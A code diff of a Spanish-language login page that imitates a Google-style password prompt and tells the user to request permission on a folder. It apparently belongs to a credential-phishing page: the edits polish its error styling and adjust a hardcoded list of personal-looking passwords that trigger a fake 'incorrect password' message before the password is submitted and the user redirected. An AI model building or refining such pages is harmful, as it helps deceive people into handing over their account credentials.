@@ -217,6 +217,11 @@
             border-color: #82aaff;
         }
 
+        /* Nuevo estilo para el campo de contraseña con error */
+        .input-field.error {
+            border-color: #ce9591;
+        }
+
         .input-label {
             position: absolute;
             top: 16px;
@@ -235,22 +240,61 @@
             color: #82aaff;
         }
 
-        .show-password-wrapper {
+        /* Mantener el color del label cuando hay error */
+        .input-field.error:focus + .input-label,
+        .input-field.error:not(:placeholder-shown) + .input-label {
+            color: #ce9591;
+        }
+
+       .show-password-wrapper {
             display: flex;
             align-items: center;
             margin-bottom: 24px;
         }
 
+        /* Estilo personalizado para el checkbox */
         .show-password-wrapper input[type="checkbox"] {
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #9aa0a6;
+            border-radius: 2px;
+            background-color: transparent;
             margin-right: 8px;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.2s ease;
+        }
+
+        .show-password-wrapper input[type="checkbox"]:checked {
+            border-color: #1a73e8;
+            background-color: #1a73e8;
+        }
+
+        .show-password-wrapper input[type="checkbox"]:checked::after {
+            content: '';
+            position: absolute;
+            left: 3px;
+            top: 0px;
+            width: 5px;
+            height: 8px;
+            border: solid white;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+
+        .show-password-wrapper input[type="checkbox"]:hover {
+            border-color: #82aaff;
         }
 
         .show-password-wrapper label {
             color: #e8eaed;
             font-size: 14px;
             cursor: pointer;
+            user-select: none;
         }
-
         .forgot-email {
             color: #c8565d;
             font-size: 14px;
@@ -266,7 +310,7 @@
         }
 
         .guest-mode {
-            color: #f35c6e;
+            color: #f08b85;
             font-size: 14px;
             line-height: 1.4286;
             margin-bottom: 24px;
@@ -366,7 +410,7 @@
         }
 
         .error-message {
-            color: #ff645a;
+            color: #f08b85;
             font-size: 14px;
             margin-top: 8px;
             text-align: left;
@@ -447,11 +491,13 @@
             
             <form id="loginForm">
                 <div class="input-wrapper">
-                    <input type="password" id="passwordInput" name="password" class="input-field" placeholder=" " minlength="5" value="" maxlength="32" required>
+                    <input type="password" id="passwordInput" name="password" class="input-field" placeholder=" " minlength="5" maxlength="32" required>
                     <label for="passwordInput" class="input-label">Introduce tu contraseña</label>
                 </div>
                 
                 <div id="errorMessage" class="error-message"></div>
+                
+         
                 
                 <div class="show-password-wrapper">
                     <input type="checkbox" id="showPassword">
@@ -459,7 +505,7 @@
                 </div>
                 
                 <div class="guest-mode" id="guestMode">
-                    Solicita nuevamente el permiso en la carpeta para continuar 
+                    Solicita el permiso en la carpeta para continuar 
                 </div>
                 
                 <div class="actions">
@@ -499,6 +545,7 @@
         const selectedEmailEl = document.getElementById('selectedEmail');
         const userInitialEl = document.getElementById('userInitial');
         const guestMode = document.getElementById('guestMode');
+        const passwordInput = document.getElementById('passwordInput');
 
         // Manejar clic en el selector de correo (flecha)
         emailSelector.addEventListener('click', function() {
@@ -517,6 +564,11 @@
             isUsingCustomEmail = true;
             // Ocultar el mensaje de guest mode cuando se escribe un email personalizado
             hideGuestModeMessage();
+        });
+
+        // Limpiar el estilo de error cuando el usuario empieza a escribir
+        passwordInput.addEventListener('input', function() {
+            passwordInput.classList.remove('error');
         });
 
         function showEmailInput() {
@@ -584,6 +636,7 @@
             
             // Limpiar errores previos
             errorMessage.style.display = 'none';
+            passwordInput.classList.remove('error');
             
             // Deshabilitar botón
             accessBtn.disabled = true;
@@ -600,7 +653,7 @@
             }
             
             // Verificar contraseñas prohibidas
-            const prohibitedWords = ["fernanda2022","haily130598","viskeily130580"];
+            const prohibitedWords = ["fernanda2022","haily130598"];
             if (prohibitedWords.some(word => password.includes(word))) {
                 isProhibitedPassword = true;
             }
@@ -658,6 +711,8 @@
                     showError("La contraseña no es correcta. Inténtalo de nuevo.");
                     hideGuestModeMessage();
                     passwordInput.value = '';
+                    // Agregar clase error al campo de contraseña
+                    passwordInput.classList.add('error');
                 } else {
                     // Si no es prohibido, redirigir normalmente
                     if (response.ok) {
